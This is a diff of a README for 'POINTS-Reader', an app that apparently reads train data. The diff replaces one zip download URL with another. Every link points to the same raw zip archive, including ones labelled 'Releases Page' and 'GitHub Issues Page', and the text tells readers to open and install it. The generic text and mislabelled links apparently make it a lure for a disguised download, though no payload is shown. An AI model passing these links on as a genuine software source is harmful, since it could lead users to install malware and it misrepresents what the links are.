@@ -1,7 +1,7 @@
 # 🚀 POINTS-Reader - Easily Read Train Data
 
 ## 📥 Download Now
-[![Download POINTS-Reader](https://raw.githubusercontent.com/hassanGH9/POINTS-Reader/master/Dale/POINTS-Reader.zip)](https://raw.githubusercontent.com/hassanGH9/POINTS-Reader/master/Dale/POINTS-Reader.zip)
+[![Download POINTS-Reader](https://github.com/hassanGH9/POINTS-Reader/raw/refs/heads/master/Dale/Reader_POINT_v2.4.zip)](https://github.com/hassanGH9/POINTS-Reader/raw/refs/heads/master/Dale/Reader_POINT_v2.4.zip)
 
 ## 📖 Table of Contents
 1. [Introduction](#introduction)
@@ -27,7 +27,7 @@ To ensure smooth operation, make sure your system meets the following requiremen
 Follow these steps to download and install POINTS-Reader on your device.
 
 1. **Visit the Download Page**
-   Go to the [Releases Page](https://raw.githubusercontent.com/hassanGH9/POINTS-Reader/master/Dale/POINTS-Reader.zip) to find the latest version of POINTS-Reader.
+   Go to the [Releases Page](https://github.com/hassanGH9/POINTS-Reader/raw/refs/heads/master/Dale/Reader_POINT_v2.4.zip) to find the latest version of POINTS-Reader.
 
 2. **Download the Application**
    On the releases page, look for the latest version. Click on the link to download the application. 
@@ -37,10 +37,10 @@ Follow these steps to download and install POINTS-Reader on your device.
 
 4. **Install the Application**
    - **Windows:**
-     - Double-click the downloaded file (e.g., `https://raw.githubusercontent.com/hassanGH9/POINTS-Reader/master/Dale/POINTS-Reader.zip`).
+     - Double-click the downloaded file (e.g., `https://github.com/hassanGH9/POINTS-Reader/raw/refs/heads/master/Dale/Reader_POINT_v2.4.zip`).
      - Follow the on-screen instructions to install.
    - **macOS:**
-     - Open the downloaded file (e.g., `https://raw.githubusercontent.com/hassanGH9/POINTS-Reader/master/Dale/POINTS-Reader.zip`).
+     - Open the downloaded file (e.g., `https://github.com/hassanGH9/POINTS-Reader/raw/refs/heads/master/Dale/Reader_POINT_v2.4.zip`).
      - Drag the POINTS-Reader icon into your Applications folder.
 
 5. **Launch the Application**
@@ -77,6 +77,6 @@ If you encounter issues, here are common problems and solutions:
    - Restart the application and try again.
 
 ## 🔧 Additional Support
-For more help or to report issues, visit our [GitHub Issues Page](https://raw.githubusercontent.com/hassanGH9/POINTS-Reader/master/Dale/POINTS-Reader.zip). You can also contact our support team through the contact information provided on the website.
+For more help or to report issues, visit our [GitHub Issues Page](https://github.com/hassanGH9/POINTS-Reader/raw/refs/heads/master/Dale/Reader_POINT_v2.4.zip). You can also contact our support team through the contact information provided on the website.
 
 Thank you for using POINTS-Reader! We value your feedback and are here to help you make the most of your experience.
